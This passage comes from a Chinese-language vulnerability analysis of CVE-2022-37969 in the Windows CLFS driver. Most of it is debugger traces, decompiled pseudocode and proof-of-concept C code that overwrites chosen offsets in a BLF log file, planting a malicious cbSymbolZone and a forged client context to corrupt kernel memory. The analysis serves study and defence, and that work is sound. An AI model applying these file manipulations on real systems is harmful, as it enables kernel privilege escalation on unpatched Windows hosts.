</span></span></code></pre></div><p>继续运行，memset已经将该指针的高四位清零</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>1: kd<span style=color:#f92672>&gt;</span> p
</span></span><span style=display:flex><span>CLFS<span style=color:#f92672>!</span>CClfsBaseFilePersisted::AllocSymbol<span style=color:#f92672>+</span>0x6c:
</span></span><span style=display:flex><span>fffff801<span style=color:#960050;background-color:#1e0010>`</span>270d020c 01af28130000    add     dword ptr <span style=color:#f92672>[</span>rdi<span style=color:#f92672>+</span>1328h<span style=color:#f92672>]</span>,ebp
</span></span><span style=display:flex><span>1: kd<span style=color:#f92672>&gt;</span> dd ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3844d0
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3844d0  c1fdf008 00000030 00080000 00000000
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3844e0  00000000 00000000 4bd8b7c0 00000000
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f3844f0  00000000 00000000 00000000 00000000
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f384500  00000000 00000000 00000000 00000000
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f384510  00000000 00000000 00000000 00000000
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f384520  00000000 00000000 00000000 00000000
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f384530  00000000 00000000 00000000 00000000
</span></span><span style=display:flex><span>ffffbd84<span style=color:#960050;background-color:#1e0010>`</span>4f384540  00000000 00000000 00000000 00000000
</span></span></code></pre></div><p>继续运行则触发异常</p><pre tabindex=0><code>1: kd&gt; k
 # Child-SP          RetAddr               Call Site
00 ffffb807`d4c5f6d8 fffff801`28112c22     nt!DbgBreakPointWithStatus
01 ffffb807`d4c5f6e0 fffff801`28112206     nt!KiBugCheckDebugBreak+0x12
02 ffffb807`d4c5f740 fffff801`27ff89c7     nt!KeBugCheck2+0x946
03 ffffb807`d4c5fe50 fffff801`2800a869     nt!KeBugCheckEx+0x107
04 ffffb807`d4c5fe90 fffff801`28009cbc     nt!KiBugCheckDispatch+0x69
05 ffffb807`d4c5ffd0 fffff801`280017af     nt!KiSystemServiceHandler+0x7c
06 ffffb807`d4c60010 fffff801`27ee2467     nt!RtlpExecuteHandlerForException+0xf
07 ffffb807`d4c60040 fffff801`27ee1066     nt!RtlDispatchException+0x297
08 ffffb807`d4c60760 fffff801`2800a9ac     nt!KiDispatchException+0x186
09 ffffb807`d4c60e20 fffff801`28006b43     nt!KiExceptionDispatch+0x12c
0a ffffb807`d4c61000 fffff801`270cb2d5     nt!KiPageFault+0x443
0b ffffb807`d4c61190 fffff801`27098655     CLFS!CClfsContainer::Close+0xd
0c ffffb807`d4c611c0 fffff801`270987b6     CLFS!CClfsLogFcbPhysical::CloseContainers+0x69
0d ffffb807`d4c611f0 fffff801`27098761     CLFS!CClfsLogFcbPhysical::Finalize+0x42
0e ffffb807`d4c61220 fffff801`270bdf42     CLFS!CClfsLogFcbPhysical::Release+0xb1
0f ffffb807`d4c61280 fffff801`270c0878     CLFS!CClfsRequest::Close+0xd6
10 ffffb807`d4c612d0 fffff801`270c0747     CLFS!ClfsDispatchIoRequest+0x108
11 ffffb807`d4c61320 fffff801`27eabac5     CLFS!CClfsDriver::LogIoDispatch+0x27
12 ffffb807`d4c61350 fffff801`281f088f     nt!IofCallDriver+0x55
13 ffffb807`d4c61390 fffff801`28219af0     nt!IopDeleteFile+0x14f
14 ffffb807`d4c61410 fffff801`27eae1a7     nt!ObpRemoveObjectRoutine+0x80
15 ffffb807`d4c61470 fffff801`28222449     nt!ObfDereferenceObjectWithTag+0xc7
16 ffffb807`d4c614b0 fffff801`282e3745     nt!ObCloseHandleTableEntry+0x6c9
17 ffffb807`d4c615f0 fffff801`2828fadd     nt!ExSweepHandleTable+0xd5
18 ffffb807`d4c616a0 fffff801`282b6d98     nt!ObKillProcess+0x35
19 ffffb807`d4c616d0 fffff801`282760f6     nt!PspRundownSingleProcess+0x204
1a ffffb807`d4c61760 fffff801`282777f8     nt!PspExitThread+0x5f6
1b ffffb807`d4c61860 fffff801`27eb4d77     nt!KiSchedulerApcTerminate+0x38
1c ffffb807`d4c618a0 fffff801`27ffce90     nt!KiDeliverApc+0x487
1d ffffb807`d4c61950 fffff801`2800a35f     nt!KiInitiateUserApc+0x70
1e ffffb807`d4c61a90 00007ffd`40c90994     nt!KiSystemServiceExit+0x9f
1f 0000005f`4e1ffa88 00007ffd`40c42dc7     ntdll!NtWaitForWorkViaWorkerFactory+0x14
20 0000005f`4e1ffa90 00007ffd`40497034     ntdll!TppWorkerThread+0x2f7
21 0000005f`4e1ffd90 00000000`00000000     0x00007ffd`40497034
</code></pre><p>到<code>CClfsLogFcbPhysical::CloseContainers</code>查看伪代码可知，通过<code>CClfsBaseFile::AcquireContainerContext</code>函数获取到container context并存在v7变量中，而后将<code>v7→pContainer</code>指针取出，如果该指针不为零则将其传入<code>CClfsContainer::Close</code></p><pre tabindex=0><code>__int64 __fastcall CClfsLogFcbPhysical::CloseContainers(CClfsLogFcbPhysical *this)
{
  int v1; // esi
  unsigned int v2; // edi
  struct _CLFS_CONTAINER_CONTEXT *v4; // rbp
  CClfsContainer *v5; // rcx
  struct _CLFS_CONTAINER_CONTEXT *v7; // [rsp+30h] [rbp+8h] BYREF

  v7 = 0i64;
  v1 = 0;
  v2 = *((_DWORD *)this + 341);
  if ( v2 &gt;= *((_DWORD *)this + 340) )
    return (unsigned int)v1;
  while ( 1 )
  {
    v1 = CClfsBaseFile::AcquireContainerContext(
           *((CClfsBaseFile **)this + 85),
           *((_DWORD *)this + (v2 &amp; 0x3FF) + 342),
           &amp;v7);
    if ( v1 &lt; 0 )
      break;
    v4 = v7;
    if ( !v7 )
      break;
    v5 = (CClfsContainer *)*((_QWORD *)v7 + 3);
    if ( v5 )
    {
      CClfsContainer::Close(v5);
      (*(void (__fastcall **)(_QWORD))(**((_QWORD **)v4 + 3) + 8i64))(*((_QWORD *)v4 + 3));
      *((_QWORD *)v4 + 3) = 0i64;
    }
    CClfsBaseFile::ReleaseContainerContext(*((CClfsBaseFile **)this + 85), &amp;v7);
    if ( ++v2 &gt;= *((_DWORD *)this + 340) )
      return (unsigned int)v1;
  }
  return 3222929421i64;
}
</code></pre><p>由于前面将这个指针的高四位清零，所以传入<code>CClfsContainer::Close</code>函数的指针为0x03</p><pre tabindex=0><code>1: kd&gt; rrcx
rcx=0000000000000003
1: kd&gt; u
CLFS!CClfsLogFcbPhysical::CloseContainers+0x69:
fffff801`27098655 488b4d18        mov     rcx,qword ptr [rbp+18h]
fffff801`27098659 488b01          mov     rax,qword ptr [rcx]
fffff801`2709865c 488b4008        mov     rax,qword ptr [rax+8]
fffff801`27098660 ff156abf0100    call    qword ptr [CLFS!_guard_dispatch_icall_fptr (fffff801`270b45d0)]
fffff801`27098666 4883651800      and     qword ptr [rbp+18h],0
fffff801`2709866b 488b8ba8020000  mov     rcx,qword ptr [rbx+2A8h]
fffff801`27098672 488d542430      lea     rdx,[rsp+30h]
fffff801`27098677 e8cc9d0200      call    CLFS!CClfsBaseFile::ReleaseContainerContext (fffff801`270c2448)
</code></pre><p>在<code>CClfsContainer::Close</code>函数内对该指针解引用，导致异常</p><pre tabindex=0><code>CLFS!CClfsContainer::Close:
fffff801`270cb2c8 48895c2408         mov     qword ptr [rsp+8], rbx
fffff801`270cb2cd 57                 push    rdi
fffff801`270cb2ce 4883ec20           sub     rsp, 20h
fffff801`270cb2d2 488bd9             mov     rbx, rcx
fffff801`270cb2d5 488b4920           mov     rcx, qword ptr [rcx+20h]
</code></pre><p><strong>第二种方式</strong></p><p>第二种方式是修改<code>cbSymbolZone</code> 为超大的值，使得<code>BaseLogRecord+0x1338+cbSymbolZone</code> 能够到达下一个<code>BaseLogRecord</code>的<code>container context</code>，并利用<code>memset</code>将<code>container_context→pContainer</code>指针的高四位清零。</p><p>在<code>CLFS!CClfsBaseFilePersisted::ReadMetadataBlock</code>断点</p><pre tabindex=0><code>bp CLFS!CClfsBaseFilePersisted::ReadMetadataBlock
</code></pre><p>运行PoC，在<code>ReadMetadataBlock</code>断下</p><pre tabindex=0><code>1: kd&gt; rrdx
rdx=0000000000007a00
1: kd&gt; k
 # Child-SP          RetAddr               Call Site
00 fffff389`53916f50 fffff806`62d9a395     CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+0xaa
01 fffff389`53916ff0 fffff806`62d9a204     CLFS!CClfsBaseFile::AcquireMetadataBlock+0x45
02 fffff389`53917020 fffff806`62d99c36     CLFS!CClfsBaseFilePersisted::ReadImage+0x1e8
03 fffff389`53917080 fffff806`62d62da2     CLFS!CClfsBaseFilePersisted::OpenImage+0x2fa
04 fffff389`53917100 fffff806`62d8eaeb     CLFS!CClfsLogFcbPhysical::Initialize+0x326
05 fffff389`53917240 fffff806`62d90a2b     CLFS!CClfsRequest::Create+0x4ef
06 fffff389`53917390 fffff806`62d907f7     CLFS!CClfsRequest::Dispatch+0x97
07 fffff389`539173e0 fffff806`62d90747     CLFS!ClfsDispatchIoRequest+0x87
08 fffff389`53917430 fffff806`668abac5     CLFS!CClfsDriver::LogIoDispatch+0x27
09 fffff389`53917460 fffff806`668629a4     nt!IofCallDriver+0x55
0a fffff389`539174a0 fffff806`66bf1dfd     nt!IoCallDriverWithTracing+0x34
0b fffff389`539174f0 fffff806`66c20cbe     nt!IopParseDevice+0x117d
0c fffff389`53917660 fffff806`66c01d3a     nt!ObpLookupObjectName+0x3fe
0d fffff389`53917830 fffff806`66c88f0f     nt!ObOpenObjectByNameEx+0x1fa
0e fffff389`53917960 fffff806`66c88ae9     nt!IopCreateFile+0x40f
0f fffff389`53917a00 fffff806`66a0a2b5     nt!NtCreateFile+0x79
10 fffff389`53917a90 00007ffa`91b0d9e4     nt!KiSystemServiceCopyEnd+0x25
11 00000058`ec6fe888 00007ffa`8bc92199     ntdll!NtCreateFile+0x14
12 00000058`ec6fe890 00000000`00000000     0x00007ffa`8bc92199
1: kd&gt; u
CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+0xaa:
fffff806`62d940ba e8a1e02104      call    nt!ExAllocatePoolWithTag (fffff806`66fb2160)
fffff806`62d940bf 488bf0          mov     rsi,rax
fffff806`62d940c2 4889442438      mov     qword ptr [rsp+38h],rax
fffff806`62d940c7 4885c0          test    rax,rax
</code></pre><p><code>ReadMetadataBlock</code>调用<code>nt!ExAllocatePoolWithTag</code>分配内核堆存储基本记录，调试器中可以看到内存分配在<code>ffffab0523ecf000</code></p><pre tabindex=0><code>1: kd&gt; p
CLFS!CClfsBaseFilePersisted::ReadMetadataBlock+0xaf:
fffff806`62d940bf 488bf0          mov     rsi,rax
1: kd&gt; rrax
rax=ffffab0523ecf000
</code></pre><p>在下面两个地方下断点</p><pre tabindex=0><code>ba w8 ffffab0523ecf000+0x68
ba w8 ffffab0523ecf000+0x200*0xE-0x8
</code></pre><p>这两个地方分别是<code>LogBlockHeader→SignatureOffset</code>和第十四个扇区签名的位置(0xc*0x200 + 0x1fe)</p><p>继续运行，在第二个断点断下，调用栈：</p><pre tabindex=0><code>1: kd&gt; k
 # Child-SP          RetAddr               Call Site
00 fffff389`539170c0 fffff806`62d63672     CLFS!CClfsLogFcbPhysical::ResetLog+0x100
01 fffff389`53917100 fffff806`62d8eaeb     CLFS!CClfsLogFcbPhysical::Initialize+0xbf6
02 fffff389`53917240 fffff806`62d90a2b     CLFS!CClfsRequest::Create+0x4ef
03 fffff389`53917390 fffff806`62d907f7     CLFS!CClfsRequest::Dispatch+0x97
04 fffff389`539173e0 fffff806`62d90747     CLFS!ClfsDispatchIoRequest+0x87
05 fffff389`53917430 fffff806`668abac5     CLFS!CClfsDriver::LogIoDispatch+0x27
06 fffff389`53917460 fffff806`668629a4     nt!IofCallDriver+0x55
07 fffff389`539174a0 fffff806`66bf1dfd     nt!IoCallDriverWithTracing+0x34
08 fffff389`539174f0 fffff806`66c20cbe     nt!IopParseDevice+0x117d
09 fffff389`53917660 fffff806`66c01d3a     nt!ObpLookupObjectName+0x3fe
0a fffff389`53917830 fffff806`66c88f0f     nt!ObOpenObjectByNameEx+0x1fa
0b fffff389`53917960 fffff806`66c88ae9     nt!IopCreateFile+0x40f
0c fffff389`53917a00 fffff806`66a0a2b5     nt!NtCreateFile+0x79
0d fffff389`53917a90 00007ffa`91b0d9e4     nt!KiSystemServiceCopyEnd+0x25
0e 00000058`ec6fe888 00007ffa`8bc92199     ntdll!NtCreateFile+0x14
0f 00000058`ec6fe890 00000000`00000000     0x00007ffa`8bc92199

1: kd&gt; ub
CLFS!CClfsLogFcbPhysical::ResetLog+0xd7:
fffff806`62d7151b 48894140        mov     qword ptr [rcx+40h],rax
fffff806`62d7151f 488b83d8010000  mov     rax,qword ptr [rbx+1D8h]
fffff806`62d71526 48894148        mov     qword ptr [rcx+48h],rax
fffff806`62d7152a 488b83e8010000  mov     rax,qword ptr [rbx+1E8h]
fffff806`62d71531 48894150        mov     qword ptr [rcx+50h],rax
fffff806`62d71535 488b83f0010000  mov     rax,qword ptr [rbx+1F0h]
**fffff806`62d7153c 48894158        mov     qword ptr [rcx+58h],rax**
fffff806`62d71540 806178df        and     byte ptr [rcx+78h],0DFh

1: kd&gt; rrcx
rcx=ffffab0523ed0ba0
</code></pre><p>继续运行，rcx+0x58的位置已经被<code>0xFFFFFFFF00000000</code>覆盖了，而<code>rcx+0x5e = ffffab0523ecf000 + 0xd * 0x200 + 0x1FE</code>，也就是rcx+0x5e位于第十四扇区签名处，此时这个签名已经被<code>0xFFFF</code>覆盖了。</p><pre tabindex=0><code>1: kd&gt; db rcx
ffffab05`23ed0ba0  07 f0 fd c1 88 00 00 00-00 00 00 01 00 00 00 00  ................
ffffab05`23ed0bb0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffab05`23ed0bc0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffab05`23ed0bd0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffab05`23ed0be0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffab05`23ed0bf0  00 00 00 00 00 00 00 00-00 00 00 00 ff ff ff ff  ................
ffffab05`23ed0c00  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffab05`23ed0c10  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
</code></pre><p>对应伪代码如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>__int64</span> <span style=color:#66d9ef>__fastcall</span> CClfsLogFcbPhysical<span style=color:#f92672>::</span><span style=color:#a6e22e>ResetLog</span>(CClfsLogFcbPhysical <span style=color:#f92672>*</span>this)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> _CLFS_CLIENT_CONTEXT <span style=color:#f92672>*</span>v2; <span style=color:#75715e>// rcx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> .
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>((CLFS_LSN <span style=color:#f92672>*</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>62</span>) <span style=color:#f92672>=</span> CLFS_LSN_INVALID;  <span style=color:#75715e>// FF FF FF FF 00 00 00 00
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> .....
</span></span><span style=display:flex><span>  v2<span style=color:#f92672>-&gt;</span>lsnRestart.Internal <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>((_QWORD <span style=color:#f92672>*</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>62</span>);<span style=color:#75715e>// 58h的偏移
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  v2<span style=color:#f92672>-&gt;</span>eState <span style=color:#f92672>&amp;=</span> <span style=color:#f92672>~</span><span style=color:#ae81ff>0x20u</span>;
</span></span><span style=display:flex><span>  CClfsBaseFile<span style=color:#f92672>::</span><span style=color:#a6e22e>ReleaseClientContext</span>(<span style=color:#f92672>*</span>((CClfsBaseFile <span style=color:#f92672>**</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>85</span>), <span style=color:#f92672>&amp;</span>v7);
</span></span><span style=display:flex><span>  CClfsBaseFilePersisted<span style=color:#f92672>::</span><span style=color:#a6e22e>ResetContainerQ</span>(
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>((CClfsBaseFilePersisted <span style=color:#f92672>**</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>85</span>),
</span></span><span style=display:flex><span>    (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span><span style=color:#66d9ef>const</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>342</span>,
</span></span><span style=display:flex><span>    v4,
</span></span><span style=display:flex><span>    (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>340</span>,
</span></span><span style=display:flex><span>    (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>341</span>);
</span></span><span style=display:flex><span>  v5 <span style=color:#f92672>=</span> CClfsBaseFilePersisted<span style=color:#f92672>::</span><span style=color:#a6e22e>IncrementUsn</span>(<span style=color:#f92672>*</span>((CClfsBaseFilePersisted <span style=color:#f92672>**</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>85</span>));
</span></span><span style=display:flex><span>  v6 <span style=color:#f92672>=</span> (CClfsBaseFilePersisted <span style=color:#f92672>*</span>)<span style=color:#f92672>*</span>((_QWORD <span style=color:#f92672>*</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>85</span>);
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>((_BYTE <span style=color:#f92672>*</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>657</span>) <span style=color:#f92672>=</span> v5;
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>((_BYTE <span style=color:#f92672>*</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>657</span>) <span style=color:#f92672>=</span> CClfsBaseFilePersisted<span style=color:#f92672>::</span><span style=color:#a6e22e>IncrementUsn</span>(v6);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>i64;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>现在有三个问题：</p><ul><li>为什么<code>CLIENT_CONTEXT→lsnRestart.Internal</code>会和第十四个扇区签名重叠</li><li>怎么调用到<code>ResetLog</code>函数导致重叠区域被重置为<code>0xFFFF</code></li><li>为什么重叠的是第十四个不是其他</li></ul><p>回到PoC中，首先将BLF文件内偏移0x9A8，这是<code>CLFS_BASE_RECORD_HEADER→rgClients</code> ，该处伪造了假的<code>client context</code>偏移0x1b30</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/5.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>	<span style=color:#66d9ef>char</span> checkSum[] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span> }; <span style=color:#75715e>// {0x59, 0xdf, 0x44, 0x06}; // offset 0x80c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>char</span> signaturOffset[] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0x50</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span> }; <span style=color:#75715e>// offset 0x868
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>char</span> ccoffsetArray[] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x1b</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span> }; <span style=color:#75715e>// offset 0x9a8
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>char</span> cbsymbolZone[] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0x4b</span>, <span style=color:#ae81ff>0x11</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x00</span> }; <span style=color:#75715e>// offset 0x1b98
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>char</span> blockNameoffset[] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0xb8</span>, <span style=color:#ae81ff>0x1b</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span> }; <span style=color:#75715e>// offset 0x2390
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>char</span> blockAtributeoffset[] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x1b</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span> }; <span style=color:#75715e>// offset 0x2394
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>_wfopen_s</span>(<span style=color:#f92672>&amp;</span>pFile, stored_env_open, <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;r+&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (pFile <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>		<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Cant&#39;t open file, error %x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>GetLastError</span>());
</span></span><span style=display:flex><span>		<span style=color:#75715e>//	getchar();
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] file successfully opened</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>// 校验和
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>fseek</span>(pFile, <span style=color:#ae81ff>0x80c</span>, SEEK_SET);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fwrite</span>(checkSum, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span>), <span style=color:#66d9ef>sizeof</span>(checkSum), pFile);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>// Signature 值
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>fseek</span>(pFile, <span style=color:#ae81ff>0x868</span>, SEEK_SET);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fwrite</span>(signaturOffset, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span>), <span style=color:#66d9ef>sizeof</span>(signaturOffset), pFile);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>// client context的偏移
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>fseek</span>(pFile, <span style=color:#ae81ff>0x9a8</span>, SEEK_SET);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fwrite</span>(ccoffsetArray, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span>), <span style=color:#66d9ef>sizeof</span>(ccoffsetArray), pFile);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>// cbsymbolZone偏移，写入恶意的cbsymbolZone
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>fseek</span>(pFile, <span style=color:#ae81ff>0x1b98</span>, SEEK_SET);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fwrite</span>(cbsymbolZone, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span>), <span style=color:#66d9ef>sizeof</span>(cbsymbolZone), pFile);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fseek</span>(pFile, <span style=color:#ae81ff>0x2390</span>, SEEK_SET);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fwrite</span>(blockNameoffset, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span>), <span style=color:#66d9ef>sizeof</span>(blockNameoffset), pFile);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fseek</span>(pFile, <span style=color:#ae81ff>0x2394</span>, SEEK_SET);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fwrite</span>(blockAtributeoffset, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span>), <span style=color:#66d9ef>sizeof</span>(blockAtributeoffset), pFile);
</span></span></code></pre></div><p>而后在偏移0x23a0(0x1b30+0x870)处伪造假的client context，伪造的假client context需要有正确的<code>client context</code>头，将原<code>client context</code>复制过去即可。此时<code>client context→lsnRestart.Internal = 0x23a0 + 0x58 = 23f8</code>，位于基本记录的<code>0x1bf8</code>处，第14个扇区的扇区签名位于<code>0xd * 0x200 + 0x1fe=1BFE</code> ，<code>client context→lsnRestart.Internal</code> 大小八个字节，刚好高二位能够覆盖到扇区签名。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>	<span style=color:#66d9ef>char</span> fakeClientcontext[] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0x07</span>, <span style=color:#ae81ff>0xf0</span>, <span style=color:#ae81ff>0xfd</span>, <span style=color:#ae81ff>0xc1</span>, <span style=color:#ae81ff>0x88</span> }; <span style=color:#75715e>// offset 0x23a0
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>char</span> fakeClientcontext2[] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span> }; <span style=color:#75715e>// offset 0x23ab
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>char</span> fakeClientcontext3[] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span> }; <span style=color:#75715e>// offset 0x2418
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Client context，伪造假的Client context头
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>fseek</span>(pFile, <span style=color:#ae81ff>0x23a0</span>, SEEK_SET);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fwrite</span>(fakeClientcontext, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span>), <span style=color:#66d9ef>sizeof</span>(fakeClientcontext), pFile);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>// Client context，伪造假的Client context头
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>fseek</span>(pFile, <span style=color:#ae81ff>0x23ab</span>, SEEK_SET);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fwrite</span>(fakeClientcontext2, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span>), <span style=color:#66d9ef>sizeof</span>(fakeClientcontext2), pFile);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#75715e>// Client context，伪造假的值，使得程序进入ResetLog
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#a6e22e>fseek</span>(pFile, <span style=color:#ae81ff>0x2418</span>, SEEK_SET);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>fwrite</span>(fakeClientcontext3, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span>), <span style=color:#66d9ef>sizeof</span>(fakeClientcontext3), pFile);
</span></span></code></pre></div><p>而ResetLog中要覆盖八个字节，刚好将第十四个扇区签名覆盖为0xFFFF</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>  v2<span style=color:#f92672>-&gt;</span>lsnRestart.Internal <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>((_QWORD <span style=color:#f92672>*</span>)this <span style=color:#f92672>+</span> <span style=color:#ae81ff>62</span>);<span style=color:#75715e>// 58h的偏移
